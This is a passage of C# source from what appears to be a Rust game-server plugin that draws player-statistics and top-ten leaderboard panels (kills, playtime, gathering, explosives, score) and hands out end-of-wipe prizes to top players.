            container.Add(new CuiPanel
            {
                CursorEnabled = false,
                Image = { Color = cat == 2 ? "0.2988604 0.6886792 0.120194 0.6431373" : "0 0 0 0" },
                RectTransform = { AnchorMin = "0.5 0", AnchorMax = "0.5 0", OffsetMin = "-57.73 0", OffsetMax = "57.73 1.871" }
            }, "Panel_56553", "Panel_8052");
            #endregion

            #region USER STAT CATEGORY
            container.Add(new CuiPanel
            {
                CursorEnabled = false,
                Image = { Color = "0 0 0 0" },
                RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-146.991 -124.121", OffsetMax = "146.389 226.031" }
            }, "USER_STAT_INFO", "MAIN_LIST_STAT_USER");

            int y = 0;
            string userLang = lang.GetLanguage(player.UserIDString);
            foreach (var item in list)
            {
                float fade = 0.15f * y;
                string itemName = string.Empty;
                if (ItemName.ContainsKey(item.Key))
                {
                    itemName = userLang == "ru" ? ItemName[item.Key].ru : ItemName[item.Key].en;
                }

                container.Add(new CuiElement
                {
                    Name = "STAT_USER_LINE",
                    Parent = "MAIN_LIST_STAT_USER",
                    Components = {
                    new CuiImageComponent { Color = "1 1 1 0.1", FadeIn = fade },
                    new CuiRectTransformComponent { AnchorMin = "0.5 1", AnchorMax = "0.5 1", OffsetMin = $"-146.118 {-44.977 - (y * 50.729)}", OffsetMax = $"146.692 {-0.765 - (y * 50.729)}" }
                }
                });
                string name = cat == 0 ? item.Value.ToString("0,0", CultureInfo.InvariantCulture) : item.Value.ToString();

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "26.03 -10.534", OffsetMax = "126.03 12.574" },
                    Text = { Text = name, Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleRight, Color = "0.8538514 0.8491456 0.8867924 1", FadeIn = fade }
                }, "STAT_USER_LINE", "STAT_USER_AMOUNT");

                if (item.Key == "all")
                {
                    string langGet = cat == 0 ? "STAT_USER_TOTAL_GATHERED" : cat == 1 ? "STAT_USER_TOTAL_EXPLODED" : "STAT_USER_TOTAL_GROWED";

                    container.Add(new CuiLabel
                    {
                        RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-128 -10.534", OffsetMax = "50 12.574" },
                        Text = { Text = GetLang(langGet, player.UserIDString), Font = "robotocondensed-regular.ttf", FontSize = 11, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1", FadeIn = fade }
                    }, "STAT_USER_LINE", "ALL_TOTAL");
                }
                else
                {
                    container.Add(new CuiElement
                    {
                        Name = "IMAGE_ITEM",
                        Parent = "STAT_USER_LINE",
                        Components = {
                            new CuiRawImageComponent { Color = "1 1 1 1",  Png = GetImage(item.Key), FadeIn = fade },
                            new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-128 -17.5", OffsetMax = "-93 17.5" }
                        }
                    });

                    container.Add(new CuiLabel
                    {
                        RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-73.17 -10.534", OffsetMax = "50 12.574" },
                        Text = { Text = itemName, Font = "robotocondensed-regular.ttf", FontSize = 10, Align = TextAnchor.MiddleLeft, Color = "0.8538514 0.8491456 0.8867924 1" , FadeIn = fade}
                    }, "STAT_USER_LINE");
                }
                y++;
            }

            #endregion

            CuiHelper.DestroyUi(player, "MENU_USER_STAT");
            CuiHelper.DestroyUi(player, "MAIN_LIST_STAT_USER");
            CuiHelper.DestroyUi(player, "STAT_LINE");
            CuiHelper.AddUi(player, container);
        }
        #endregion
        #endregion

        #region TopTenUserStatPage
        private void TopTen(BasePlayer player)
        {
            var container = new CuiElementContainer();
            container.Add(new CuiPanel
            {
                CursorEnabled = false,
                Image = { Color = "1 1 1 0" },
                RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-640 -360.001", OffsetMax = "640 266.939" }
            }, UI_INTERFACE, UI_TOP_TEN_USER);

            container.Add(new CuiPanel
            {
                CursorEnabled = false,
                Image = { Color = "0 0 0 0" },
                RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-599.3 -237.224", OffsetMax = "589.334 271.441" }
            }, UI_TOP_TEN_USER, "TOP_10_TABLE");

            if (config.settings.pveServerMode)
            {
                #region KillerNPC
                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 1", AnchorMax = "0 1", OffsetMin = "9.2 -20.655", OffsetMax = "176.343 -3.545" },
                    Text = { Text = GetLang("STAT_UI_CATEGORY_TOP_KILLER_ANIMALS", player.UserIDString), Font = "robotocondensed-regular.ttf", FontSize = 11, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" }
                }, "TOP_10_TABLE");

                container.Add(new CuiElement
                {
                    Name = "TOP_TABLE_0",
                    Parent = "TOP_10_TABLE",
                    Components = {
                    new CuiImageComponent { Color = "1 1 1 0.15" },
                    new CuiRectTransformComponent { AnchorMin = "0 1", AnchorMax = "0 1", OffsetMin = "9.575 -441.751", OffsetMax = "177.214 -26.861" }
                }
                });
                var AnimalKillerList = Players.OrderByDescending(x => x.Value.otherStat.AnimalsKill).Take(10);

                int y = 0;

                foreach (var item in AnimalKillerList)
                {

                    string LockStatus = item.Value.HidedStatistics == true ? "assets/icons/lock.png" : "assets/icons/unlock.png";
                    string Command = item.Value.HidedStatistics == true ? "" : $"UI_HandlerStat GoStatPlayers {item.Key}";
                    if (permission.UserHasPermission(player.UserIDString, permAdmin))
                        Command = $"UI_HandlerStat GoStatPlayers {item.Key}";
                    string color = y == 0 ? config.settingsInterface.ColorTop1 : y == 1 ? config.settingsInterface.ColorTop2 : y == 2 ? config.settingsInterface.ColorTop3 : "0 0 0 0";

                    container.Add(new CuiPanel
                    {
                        CursorEnabled = false,
                        Image = { Color = color },
                        RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = $"-83.82 {177.277 - (y * 42.863)}", OffsetMax = $"83.82 {207.448 - (y * 42.863)}" }
                    }, "TOP_TABLE_0", "USER_INFO");
                    container.Add(new CuiElement
                    {
                        Name = "USER_STAT_HIDE",
                        Parent = "USER_INFO",
                        Components = {
                    new CuiImageComponent { Color = "1 1 1 1", Sprite = LockStatus },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-80.2 -6.5", OffsetMax = "-67.2 6.5" }
                }
                    });

                    container.Add(new CuiLabel
                    {
                        RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-64.822 -6.724", OffsetMax = "7.522 6.724" },
                        Text = { Text = GetCorrectName(item.Value.Name, 17), Font = "robotocondensed-regular.ttf", FontSize = 9, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" }
                    }, "USER_INFO");

                    container.Add(new CuiLabel
                    {
                        RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "7.522 -6.724", OffsetMax = "76.934 6.724" },
                        Text = { Text = item.Value.otherStat.AnimalsKill.ToString(), Font = "robotocondensed-regular.ttf", FontSize = 9, Align = TextAnchor.MiddleRight, Color = "1 1 1 1" }
                    }, "USER_INFO");

                    container.Add(new CuiButton
                    {
                        RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                        Button = { Command = Command, Color = "0 0 0 0" },
                        Text = { Text = "" }
                    }, "USER_INFO");
                    y++;
                }
                #endregion
            }
            else
            {
                #region Killer

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 1", AnchorMax = "0 1", OffsetMin = "9.2 -20.655", OffsetMax = "176.343 -3.545" },
                    Text = { Text = GetLang("STAT_UI_CATEGORY_TOP_KILLER", player.UserIDString), Font = "robotocondensed-regular.ttf", FontSize = 11, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" }
                }, "TOP_10_TABLE");

                container.Add(new CuiElement
                {
                    Name = "TOP_TABLE_0",
                    Parent = "TOP_10_TABLE",
                    Components = {
                    new CuiImageComponent { Color = "1 1 1 0.15" },
                    new CuiRectTransformComponent { AnchorMin = "0 1", AnchorMax = "0 1", OffsetMin = "9.575 -441.751", OffsetMax = "177.214 -26.861" }
                }
                });
                var KillerList = Players.OrderByDescending(x => x.Value.pVP.Kills).Take(10);

                int y = 0;

                foreach (var item in KillerList)
                {

                    string LockStatus = item.Value.HidedStatistics == true ? "assets/icons/lock.png" : "assets/icons/unlock.png";
                    string Command = item.Value.HidedStatistics == true ? "" : $"UI_HandlerStat GoStatPlayers {item.Key}";
                    if (permission.UserHasPermission(player.UserIDString, permAdmin))
                        Command = $"UI_HandlerStat GoStatPlayers {item.Key}";
                    string color = y == 0 ? config.settingsInterface.ColorTop1 : y == 1 ? config.settingsInterface.ColorTop2 : y == 2 ? config.settingsInterface.ColorTop3 : "0 0 0 0";

                    container.Add(new CuiPanel
                    {
                        CursorEnabled = false,
                        Image = { Color = color },
                        RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = $"-83.82 {177.277 - (y * 42.863)}", OffsetMax = $"83.82 {207.448 - (y * 42.863)}" }
                    }, "TOP_TABLE_0", "USER_INFO");
                    container.Add(new CuiElement
                    {
                        Name = "USER_STAT_HIDE",
                        Parent = "USER_INFO",
                        Components = {
                    new CuiImageComponent { Color = "1 1 1 1", Sprite = LockStatus },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-80.2 -6.5", OffsetMax = "-67.2 6.5" }
                }
                    });

                    container.Add(new CuiLabel
                    {
                        RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-64.822 -6.724", OffsetMax = "7.522 6.724" },
                        Text = { Text = GetCorrectName(item.Value.Name, 17), Font = "robotocondensed-regular.ttf", FontSize = 9, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" }
                    }, "USER_INFO");

                    container.Add(new CuiLabel
                    {
                        RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "7.522 -6.724", OffsetMax = "76.934 6.724" },
                        Text = { Text = item.Value.pVP.Kills.ToString(), Font = "robotocondensed-regular.ttf", FontSize = 9, Align = TextAnchor.MiddleRight, Color = "1 1 1 1" }
                    }, "USER_INFO");

                    container.Add(new CuiButton
                    {
                        RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                        Button = { Command = Command, Color = "0 0 0 0" },
                        Text = { Text = "" }
                    }, "USER_INFO");
                    y++;
                }
                #endregion
            }

            #region Npc_Killer
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 1", AnchorMax = "0 1", OffsetMin = "209.129 -20.655", OffsetMax = "376.271 -3.545" },
                Text = { Text = GetLang("STAT_UI_CATEGORY_TOP_NPCKILLER", player.UserIDString), Font = "robotocondensed-regular.ttf", FontSize = 11, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" }
            }, "TOP_10_TABLE");

            container.Add(new CuiElement
            {
                Name = "TOP_TABLE_1",
                Parent = "TOP_10_TABLE",
                Components = {
                    new CuiImageComponent { Color = "1 1 1 0.15" },
                    new CuiRectTransformComponent { AnchorMin = "0 1", AnchorMax = "0 1", OffsetMin = "210.281 -441.751", OffsetMax = "377.919 -26.861" }
                }
            });

            var KillerNpcList = Players.OrderByDescending(x => x.Value.pVP.KillsNpc).Take(10);

            int i = 0;
            foreach (var item in KillerNpcList)
            {
                
                string LockStatus = item.Value.HidedStatistics == true ? "assets/icons/lock.png" : "assets/icons/unlock.png";
                string Command = item.Value.HidedStatistics == true ? "" : $"UI_HandlerStat GoStatPlayers {item.Key}";
                if (permission.UserHasPermission(player.UserIDString, permAdmin))
                    Command = $"UI_HandlerStat GoStatPlayers {item.Key}";
                string color = i == 0 ? config.settingsInterface.ColorTop1 : i == 1 ? config.settingsInterface.ColorTop2 : i == 2 ? config.settingsInterface.ColorTop3 : "0 0 0 0";

                container.Add(new CuiPanel
                {
                    CursorEnabled = false,
                    Image = { Color = color },
                    RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = $"-83.82 {177.277 - (i * 42.863)}", OffsetMax = $"83.82 {207.448 - (i * 42.863)}" }
                }, "TOP_TABLE_1", "USER_INFO");

                container.Add(new CuiElement
                {
                    Name = "USER_STAT_HIDE",
                    Parent = "USER_INFO",
                    Components = {
                    new CuiImageComponent { Color = "1 1 1 1", Sprite = LockStatus },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-80.2 -6.5", OffsetMax = "-67.2 6.5" }
                }
                });

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-64.822 -6.724", OffsetMax = "7.522 6.724" },
                    Text = { Text = GetCorrectName(item.Value.Name, 17), Font = "robotocondensed-regular.ttf", FontSize = 9, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" }
                }, "USER_INFO");

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "7.522 -6.724", OffsetMax = "76.934 6.724" },
                    Text = { Text = item.Value.pVP.KillsNpc.ToString(), Font = "robotocondensed-regular.ttf", FontSize = 9, Align = TextAnchor.MiddleRight, Color = "1 1 1 1" }
                }, "USER_INFO");
                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Button = { Command = Command, Color = "0 0 0 0" },
                    Text = { Text = "" }
                }, "USER_INFO");
                i++;
            }
            #endregion

            #region Time

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 1", AnchorMax = "0 1", OffsetMin = "409.229 -20.655", OffsetMax = "576.371 -3.545" },
                Text = { Text = GetLang("STAT_UI_CATEGORY_TOP_TIME", player.UserIDString), Font = "robotocondensed-regular.ttf", FontSize = 11, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" }
            }, "TOP_10_TABLE");

            container.Add(new CuiElement
            {
                Name = "TOP_TABLE_2",
                Parent = "TOP_10_TABLE",
                Components = {
                    new CuiImageComponent { Color = "1 1 1 0.15" },
                    new CuiRectTransformComponent { AnchorMin = "0 1", AnchorMax = "0 1", OffsetMin = "409.231 -441.751", OffsetMax = "576.869 -26.861" }
                }
            });
            var TimeList = Players.OrderByDescending(x => x.Value.playedTime.PlayedForWipe).Take(10);

            int c = 0;
            foreach (var item in TimeList)
            {
                string LockStatus = item.Value.HidedStatistics == true ? "assets/icons/lock.png" : "assets/icons/unlock.png";
                string Command = item.Value.HidedStatistics == true ? "" : $"UI_HandlerStat GoStatPlayers {item.Key}";
                if (permission.UserHasPermission(player.UserIDString, permAdmin))
                    Command = $"UI_HandlerStat GoStatPlayers {item.Key}";
                string color = c == 0 ? config.settingsInterface.ColorTop1 : c == 1 ? config.settingsInterface.ColorTop2 : c == 2 ? config.settingsInterface.ColorTop3 : "0 0 0 0";

                container.Add(new CuiPanel
                {
                    CursorEnabled = false,
                    Image = { Color = color },
                    RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = $"-83.82 {177.277 - (c * 42.863)}", OffsetMax = $"83.82 {207.448 - (c * 42.863)}" }
                }, "TOP_TABLE_2", "USER_INFO");
                container.Add(new CuiElement
                {
                    Name = "USER_STAT_HIDE",
                    Parent = "USER_INFO",
                    Components = {
                    new CuiImageComponent { Color = "1 1 1 1", Sprite = LockStatus },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-80.2 -6.5", OffsetMax = "-67.2 6.5" }
                }
                });
                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-64.822 -6.724", OffsetMax = "7.522 6.724" },
                    Text = { Text = GetCorrectName(item.Value.Name, 17), Font = "robotocondensed-regular.ttf", FontSize = 9, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" }
                }, "USER_INFO");

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "7.522 -6.724", OffsetMax = "76.934 6.724" },
                    Text = { Text = TimeHelper.FormatTime(TimeSpan.FromMinutes(item.Value.playedTime.PlayedForWipe), 5, lang.GetLanguage(player.UserIDString)), Font = "robotocondensed-regular.ttf", FontSize = 9, Align = TextAnchor.MiddleRight, Color = "1 1 1 1" }
                }, "USER_INFO");
                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Button = { Command = Command, Color = "0 0 0 0" },
                    Text = { Text = "" }
                }, "USER_INFO");
                c++;
            }
            #endregion

            #region Farm
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "1 1", AnchorMax = "1 1", OffsetMin = "-580.571 -20.655", OffsetMax = "-413.429 -3.545" },
                Text = { Text = GetLang("STAT_UI_CATEGORY_TOP_GATHER", player.UserIDString), Font = "robotocondensed-regular.ttf", FontSize = 11, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" }
            }, "TOP_10_TABLE");

            container.Add(new CuiElement
            {
                Name = "TOP_TABLE_3",
                Parent = "TOP_10_TABLE",
                Components = {
                    new CuiImageComponent { Color = "1 1 1 0.15" },
                    new CuiRectTransformComponent { AnchorMin = "1 1", AnchorMax = "1 1", OffsetMin = "-580.099 -441.751", OffsetMax = "-412.461 -26.861" }
                }
            });

            var FarmList = Players.OrderByDescending(x => x.Value.gather.AllGathered).Take(10);
            int f = 0;

            foreach (var item in FarmList)
            {
                string LockStatus = item.Value.HidedStatistics == true ? "assets/icons/lock.png" : "assets/icons/unlock.png";
                string Command = item.Value.HidedStatistics == true ? "" : $"UI_HandlerStat GoStatPlayers {item.Key}";
                if (permission.UserHasPermission(player.UserIDString, permAdmin))
                    Command = $"UI_HandlerStat GoStatPlayers {item.Key}";
                string color = f == 0 ? config.settingsInterface.ColorTop1 : f == 1 ? config.settingsInterface.ColorTop2 : f == 2 ? config.settingsInterface.ColorTop3 : "0 0 0 0";

                container.Add(new CuiPanel
                {
                    CursorEnabled = false,
                    Image = { Color = color },
                    RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = $"-83.82 {177.277 - (f * 42.863)}", OffsetMax = $"83.82 {207.448 - (f * 42.863)}" }
                }, "TOP_TABLE_3", "USER_INFO");

                container.Add(new CuiElement
                {
                    Name = "USER_STAT_HIDE",
                    Parent = "USER_INFO",
                    Components = {
                    new CuiImageComponent { Color = "1 1 1 1", Sprite = LockStatus },
                    new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-80.2 -6.5", OffsetMax = "-67.2 6.5" }
                }
                });

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-64.822 -6.724", OffsetMax = "7.522 6.724" },
                    Text = { Text = GetCorrectName(item.Value.Name, 17), Font = "robotocondensed-regular.ttf", FontSize = 9, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" }
                }, "USER_INFO");

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "7.522 -6.724", OffsetMax = "76.934 6.724" },
                    Text = { Text = item.Value.gather.AllGathered.ToString("0,0", CultureInfo.InvariantCulture), Font = "robotocondensed-regular.ttf", FontSize = 9, Align = TextAnchor.MiddleRight, Color = "1 1 1 1" }
                }, "USER_INFO");
                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Button = { Command = Command, Color = "0 0 0 0" },
                    Text = { Text = "" }
                }, "USER_INFO");
                f++;
            }

            #endregion

            #region Explosion

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "1 1", AnchorMax = "1 1", OffsetMin = "-381.151 -20.655", OffsetMax = "-214.009 -3.545" },
                Text = { Text = GetLang("STAT_UI_CATEGORY_TOP_EXPLOSED", player.UserIDString), Font = "robotocondensed-regular.ttf", FontSize = 11, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" }
            }, "TOP_10_TABLE");


            container.Add(new CuiElement
            {
                Name = "TOP_TABLE_5",
                Parent = "TOP_10_TABLE",
                Components = {
                    new CuiImageComponent { Color = "1 1 1 0.15" },
                    new CuiRectTransformComponent { AnchorMin = "1 1", AnchorMax = "1 1", OffsetMin = "-380.679 -441.751", OffsetMax = "-213.041 -26.861"  }
                }
            });
            

            var ExpList = Players.OrderByDescending(x => x.Value.explosion.AllExplosionUsed).Take(10);
            int z = 0;
            foreach (var item in ExpList)
            {
                string LockStatus = item.Value.HidedStatistics == true ? "assets/icons/lock.png" : "assets/icons/unlock.png";
                string Command = item.Value.HidedStatistics == true ? "" : $"UI_HandlerStat GoStatPlayers {item.Key}";
                if (permission.UserHasPermission(player.UserIDString, permAdmin))
                    Command = $"UI_HandlerStat GoStatPlayers {item.Key}";
                string color = z == 0 ? config.settingsInterface.ColorTop1 : z == 1 ? config.settingsInterface.ColorTop2 : z == 2 ? config.settingsInterface.ColorTop3 : "0 0 0 0";

                container.Add(new CuiPanel
                {
                    CursorEnabled = false,
                    Image = { Color = color },
                    RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = $"-83.82 {177.277 - (z * 42.863)}", OffsetMax = $"83.82 {207.448 - (z * 42.863)}" }
                }, "TOP_TABLE_5", "USER_INFO");

                container.Add(new CuiElement
                {
                    Name = "USER_STAT_HIDE",
                    Parent = "USER_INFO",
                    Components = {
                        new CuiImageComponent { Color = "1 1 1 1", Sprite = LockStatus },
                        new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-80.2 -6.5", OffsetMax = "-67.2 6.5" }
                    }
                });

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-64.822 -6.724", OffsetMax = "7.522 6.724" },
                    Text = { Text = GetCorrectName(item.Value.Name, 17), Font = "robotocondensed-regular.ttf", FontSize = 9, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" }
                }, "USER_INFO");

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "7.522 -6.724", OffsetMax = "76.934 6.724" },
                    Text = { Text = item.Value.explosion.AllExplosionUsed.ToString(), Font = "robotocondensed-regular.ttf", FontSize = 9, Align = TextAnchor.MiddleRight, Color = "1 1 1 1" }
                }, "USER_INFO");
                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Button = { Command = Command, Color = "0 0 0 0" },
                    Text = { Text = "" }
                }, "USER_INFO");
                z++;
            }
            #endregion

            #region Score
            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "1 1", AnchorMax = "1 1", OffsetMin = "-180.871 -20.655", OffsetMax = "-13.729 -3.545" },
                Text = { Text = GetLang("STAT_UI_CATEGORY_TOP_SCORE", player.UserIDString), Font = "robotocondensed-regular.ttf", FontSize = 11, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" }
            }, "TOP_10_TABLE");

            container.Add(new CuiElement
            {
                Name = "TOP_TABLE_4",
                Parent = "TOP_10_TABLE",
                Components = {
                    new CuiImageComponent { Color = "1 1 1 0.15" },
                    new CuiRectTransformComponent { AnchorMin = "1 1", AnchorMax = "1 1", OffsetMin = "-180.419 -441.751", OffsetMax = "-12.781 -26.861"}
                }
            });

            var ScoreList = Players.OrderByDescending(x => x.Value.Score).Take(10);
            int s = 0;

            foreach (var item in ScoreList)
            {
                string LockStatus = item.Value.HidedStatistics == true ? "assets/icons/lock.png" : "assets/icons/unlock.png";
                string Command = item.Value.HidedStatistics == true ? "" : $"UI_HandlerStat GoStatPlayers {item.Key}";
                if (permission.UserHasPermission(player.UserIDString, permAdmin))
                    Command = $"UI_HandlerStat GoStatPlayers {item.Key}";
                string color = s == 0 ? config.settingsInterface.ColorTop1 : s == 1 ? config.settingsInterface.ColorTop2 : s == 2 ? config.settingsInterface.ColorTop3 : "0 0 0 0";
                container.Add(new CuiPanel
                {
                    CursorEnabled = false,
                    Image = { Color = color },
                    RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = $"-83.82 {177.277 - (s * 42.863)}", OffsetMax = $"83.82 {207.448 - (s * 42.863)}" }
                }, "TOP_TABLE_4", "USER_INFO");

                container.Add(new CuiElement
                {
                    Name = "USER_STAT_HIDE",
                    Parent = "USER_INFO",
                    Components = {
                        new CuiImageComponent { Color = "1 1 1 1", Sprite = LockStatus },
                        new CuiRectTransformComponent { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-80.2 -6.5", OffsetMax = "-67.2 6.5" }
                    }
                });
                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "-64.822 -6.724", OffsetMax = "7.522 6.724" },
                    Text = { Text = GetCorrectName(item.Value.Name, 17), Font = "robotocondensed-regular.ttf", FontSize = 9, Align = TextAnchor.MiddleLeft, Color = "1 1 1 1" }
                }, "USER_INFO");

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0.5 0.5", AnchorMax = "0.5 0.5", OffsetMin = "7.522 -6.724", OffsetMax = "76.934 6.724" },
                    Text = { Text = item.Value.Score.ToString("0.00"), Font = "robotocondensed-regular.ttf", FontSize = 9, Align = TextAnchor.MiddleRight, Color = "1 1 1 1" }
                }, "USER_INFO");
                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                    Button = { Command = Command, Color = "0 0 0 0" },
                    Text = { Text = "" }
                }, "USER_INFO");
                s++;
            }
            #endregion

            CloseLayer(player);
            CuiHelper.AddUi(player, container);
        }
        #endregion

        #endregion

        #region OtherMetods
        private void SendMsgRewardWipe(BasePlayer player)
        {
            var playerGrant = PrizePlayerData[player.userID];

            foreach (var item in playerGrant)
            {
                switch (item.catType)
                {
                    case CatType.score:
                        player.ChatMessage(GetLang("STAT_TOP_PLAYER_WIPE_SCORE", player.UserIDString, item.top));
                        break;
                    case CatType.killer:
                        player.ChatMessage(GetLang("STAT_TOP_PLAYER_WIPE_KILL", player.UserIDString, item.top));
                        break;
                    case CatType.time:
                        player.ChatMessage(GetLang("STAT_TOP_PLAYER_WIPE_TIME", player.UserIDString, item.top));
                        break;
                    case CatType.farm:
                        player.ChatMessage(GetLang("STAT_TOP_PLAYER_WIPE_FARM", player.UserIDString, item.top));
                        break;
                    case CatType.raid:
                        player.ChatMessage(GetLang("STAT_TOP_PLAYER_WIPE_EXP", player.UserIDString, item.top));
                        break;
                    case CatType.killerNPC:
                        player.ChatMessage(GetLang("STAT_TOP_PLAYER_WIPE_KILL_NPC", player.UserIDString, item.top));
                        break;
                }
            }
            NextTick(() => { PrizePlayerData.Remove(player.userID); SaveDataPrize(); });
        }
        private void ParseTopUserForPrize()
        {
            PrizePlayerData.Clear();

            List<CatType> catTypes = new List<CatType> { CatType.score, CatType.killer, CatType.time, CatType.farm,  CatType.raid, };
            foreach (var cat in catTypes)
            {
                switch (cat)    
                {
                    case CatType.score:
                        {
                            int countReward = config.settingsPrize.prizeScore.Count;
                            if (countReward != 0)
                            {
                                var score = Players.OrderByDescending(x => x.Value.Score).Take(countReward);
                                int top = 1;
                                foreach (var item in score)
                                {
                                    if (!PrizePlayerData.ContainsKey(item.Key))
                                    {
                                        PrizePlayerData.Add(item.Key, new List<PrizePlayer>());
                                    }
                                    var player = PrizePlayerData[item.Key];
                                    player.Add(new PrizePlayer { catType = cat, Name = item.Value.Name, value = (int)item.Value.Score, top = top });
                                    config.settingsPrize.prizeScore.Find(x => x.top == top)?.GiftPrizePlayer(item.Key.ToString());
                                    top++;
                                }
                            }
                            break;
                        }
                    case CatType.killer:
                        {
                            int countReward = config.settingsPrize.prizeKiller.Count;
                            if (countReward != 0)
                            {
                                var killer = Players.OrderByDescending(x => x.Value.pVP.Kills).Take(countReward);
                                int top = 1;
                                foreach (var item in killer)
                                {
                                    if (!PrizePlayerData.ContainsKey(item.Key))
                                    {
                                        PrizePlayerData.Add(item.Key, new List<PrizePlayer>());
                                    }
                                    var player = PrizePlayerData[item.Key];
                                    player.Add(new PrizePlayer { catType = cat, Name = item.Value.Name, value = (int)item.Value.pVP.Kills, top = top });
                                    config.settingsPrize.prizeKiller.Find(x => x.top == top)?.GiftPrizePlayer(item.Key.ToString());
                                    top++;
                                }
                            }
                            break;
                        }
                    case CatType.time:
                        {
                            int countReward = config.settingsPrize.prizeTime.Count;
                            if (countReward != 0)
                            {
                                var time = Players.OrderByDescending(x => x.Value.playedTime.PlayedForWipe).Take(countReward);
                                int top = 1;
                                foreach (var item in time)
                                {
                                    if (!PrizePlayerData.ContainsKey(item.Key))
                                    {
                                        PrizePlayerData.Add(item.Key, new List<PrizePlayer>());
                                    }
                                    var player = PrizePlayerData[item.Key];
                                    player.Add(new PrizePlayer { catType = cat, Name = item.Value.Name, value = (int)item.Value.playedTime.PlayedForWipe, top = top });
                                    config.settingsPrize.prizeTime.Find(x => x.top == top)?.GiftPrizePlayer(item.Key.ToString());
                                    top++;
                                }
                            }
                            break;
                        }
                    case CatType.farm:
                        {
                            int countReward = config.settingsPrize.prizeFarm.Count;
                            if (countReward != 0)
                            {
